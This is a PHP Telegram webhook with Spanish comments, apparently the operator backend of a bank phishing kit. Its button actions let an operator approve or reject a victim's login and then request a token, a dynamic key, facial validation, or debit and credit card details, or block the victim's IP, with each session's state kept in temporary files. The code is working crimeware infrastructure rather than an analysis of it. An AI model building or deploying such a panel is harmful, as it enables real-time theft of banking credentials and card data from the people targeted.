<?php
// api/webhook.php

header('Content-Type: application/json; charset=utf-8');

// 1. Obtener el cuerpo de la petición que envía Telegram
$content = file_get_contents("php://input");
$update = json_decode($content, true);

// Si no hay datos válidos o no es una consulta de botón (callback_query), salimos con 200 OK para evitar reintentos de Telegram
if (!$update || !isset($update['callback_query'])) {
    http_response_code(200);
    echo json_encode(["status" => "ignored"]);
    exit;
}

$cb = $update['callback_query'];
$cbData = $cb['data'] ?? '';
$cbqId  = $cb['id'] ?? '';
$chatId = $cb['message']['chat']['id'] ?? '';
$msgId  = $cb['message']['message_id'] ?? '';

// Token del bot (asegúrate de configurarlo como variable de entorno en Vercel o cámbialo aquí)
$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: 'TU_BOT_TOKEN_AQUI';

// Responder al callback inmediatamente para quitar el estado de carga en el botón de Telegram
if ($cbqId) {
    @file_get_contents("https://api.telegram.org/bot{$botToken}/answerCallbackQuery?callback_query_id={$cbqId}");
}

// 2. Parsear los datos del botón: accion_step_sessionId (ej: aprobar_login_sess_12345)
if (!preg_match('/^(\w+)_(.+)_(sess_[a-zA-Z0-9_]+)$/', $cbData, $m)) {
    http_response_code(200);
    exit;
}

$action = $m[1];
$step   = $m[2];
$sessId = $m[3];

// 3. Ruta al archivo de sesión en Vercel (/tmp es el único directorio con permisos de escritura)
$dataDir = sys_get_temp_dir();
$sessFile = $dataDir . "/{$sessId}.json";

if (file_exists($sessFile)) {
    $sessFp = fopen($sessFile, 'r+');
    if ($sessFp && flock($sessFp, LOCK_EX)) {
        $sessContent = stream_get_contents($sessFp);
        $sessData = json_decode($sessContent, true) ?: [];

        if (($sessData['status'] ?? '') === 'pending') {
            $sessData['status'] = 'completed';
            $sessData['action'] = $action;

            // 4. Actualizar el texto del mensaje en Telegram
            $actionLabels = [
                'aprobar'  => '✅ APROBADO',
                'rechazar' => '❌ RECHAZADO',
                'token'    => '🔐 SOLICITAR TOKEN',
                'dinamica' => '💳 SOLICITAR CLAVE DINÁMICA',
                'face'     => '👤 SOLICITAR VALIDACIÓN FACIAL',
                'debito'   => '💳 SOLICITAR TARJETA DÉBITO',
                'credito'  => '💰 SOLICITAR TARJETA CRÉDITO',
                '923'      => '⚠️ ENVIAR ERROR 923',
                'banip'    => '🚫 BLOQUEAR IP'
            ];
            
            $actionText = $actionLabels[$action] ?? 'Acción realizada';
            $originalText = $sessData['messageText'] ?? ($cb['message']['text'] ?? '');
            $newText = $originalText . "\n\n<b>" . $actionText . "</b>";

            $editBody = http_build_query([
                'chat_id'      => $chatId,
                'message_id'   => $msgId,
                'text'         => $newText,
                'parse_mode'   => 'HTML',
                'reply_markup' => json_encode(['inline_keyboard' => []])
            ]);

            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
            curl_setopt_array($ch, [
                CURLOPT_POST            => true,
                CURLOPT_POSTFIELDS      => $editBody,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT         => 10,
                CURLOPT_SSL_VERIFYPEER => true
            ]);
            curl_exec($ch);
            curl_close($ch);

            // Guardar cambios en el archivo de sesión
            ftruncate($sessFp, 0);
            rewind($sessFp);
            fwrite($sessFp, json_encode($sessData));
            fflush($sessFp);
        }

        flock($sessFp, LOCK_UN);
        fclose($sessFp);
    }
}

// Responder siempre 200 OK a Telegram
http_response_code(200);
echo json_encode(["status" => "ok"]);